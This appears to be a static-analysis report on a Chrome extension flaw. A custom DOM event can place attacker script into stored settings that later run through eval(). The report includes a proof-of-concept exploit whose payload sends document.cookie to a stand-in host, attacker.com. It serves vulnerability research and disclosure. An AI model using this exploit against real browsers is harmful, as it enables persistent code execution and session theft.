# CoCo Analysis: oghkhbjjhjmlonobjmkinpeaiadoolfa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (all variations of same attack path)

---

## Sink: document_eventListener_sf_send_autocode_from_editor → bg_localStorage_setItem_value_sink → eval()

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oghkhbjjhjmlonobjmkinpeaiadoolfa/opgen_generated_files/cs_0.js
Line 534: `document.addEventListener("sf_send_autocode_from_editor", function(event)`
Line 537: `var autocode=event.detail;` (attacker-controlled)
Line 554-567: Attacker data copied to settings object
Line 573: `chrome.runtime.sendMessage({messageType: "saveSettings", value:settings});`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oghkhbjjhjmlonobjmkinpeaiadoolfa/opgen_generated_files/bg.js
Line 1176: `localStorage.setItem('settings', JSON.stringify(settings));`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oghkhbjjhjmlonobjmkinpeaiadoolfa/opgen_generated_files/cs_0.js
Line 658: `eval('{'+x.script+'}');` (x.script is attacker-controlled from storage)

**Code:**

```javascript
// Content script - Entry point (runs on all URLs per manifest)
internal_is_certified_editor = function(event) {
    var baseURI = event.srcElement.baseURI; // ← attacker can control via iframe
    if (baseURI == 'https://www.swiftformatter.com/' || baseURI == 'http://localhost:4200/') {
        return true;
    }
    return false;
}

document.addEventListener("sf_send_autocode_from_editor", function(event) { // ← attacker can dispatch
    if (internal_is_certified_editor(event)) {
        var autocode = event.detail; // ← attacker-controlled
        if (autocode) {
            var p = {id: autocode.id};
            settings.autorun.customcodes.push(p);

            p.name = autocode.name;
            p.websites = autocode.websites; // ← attacker sets URL regex
            p.script = autocode.script; // ← attacker-controlled code
            p.activated = autocode.activated; // ← attacker enables
            p.parameters = autocode.parameters;

            // Send to background to persist
            chrome.runtime.sendMessage({messageType: "saveSettings", value: settings});
        }
    }
});

// Background script - Storage handler
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.messageType === 'saveSettings') {
        settings = request.value; // ← receives poisoned settings
        localStorage.setItem('settings', JSON.stringify(settings)); // ← persists malicious code
    }
});

// Content script - Code execution on page load
var prepareAutoRun = function() {
    if (settings.running && settings.autorun.running) {
        var currentUrl = document.location.href;
        settings.autorun.customcodes.forEach(function(x) { // ← iterate stored codes
            if (x.activated) {
                var websites = x.websites.split(/\s|;|,/);
                var matching = false;
                websites.forEach(function(y) {
                    var reg = new RegExp(y, 'g');
                    if (reg.test(currentUrl)) { // ← match attacker-controlled regex
                        matching = true;
                    }
                });

                if (matching) {
                    try {
                        eval('{' + x.script + '}'); // ← CODE EXECUTION with attacker payload
                    } catch(e) {
                        console.log('Failed to start Auto Run: ' + x.name, e);
                    }
                }
            }
        });
    }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**

```javascript
// Step 1: Create iframe to bypass baseURI check
var iframe = document.createElement('iframe');
iframe.src = 'https://www.swiftformatter.com/';
document.body.appendChild(iframe);

// Step 2: Wait for iframe to load, then dispatch malicious event from it
iframe.onload = function() {
    var maliciousPayload = {
        id: "pwned",
        name: "Malicious Code",
        script: "alert('XSS: ' + document.cookie); fetch('https://attacker.com/steal?data=' + document.cookie)", // ← arbitrary JavaScript
        activated: true,
        websites: ".*", // ← match all URLs
        parameters: []
    };

    // Dispatch from iframe context so baseURI check passes
    iframe.contentDocument.dispatchEvent(
        new CustomEvent("sf_send_autocode_from_editor", {
            detail: maliciousPayload,
            bubbles: true
        })
    );
};
```

**Impact:** Complete stored XSS leading to arbitrary code execution. The attacker can inject malicious JavaScript that persists in localStorage and executes on all future page loads matching the attacker-controlled URL regex. This allows cookie theft, DOM manipulation, credential harvesting, and complete compromise of user's browsing session across all websites.
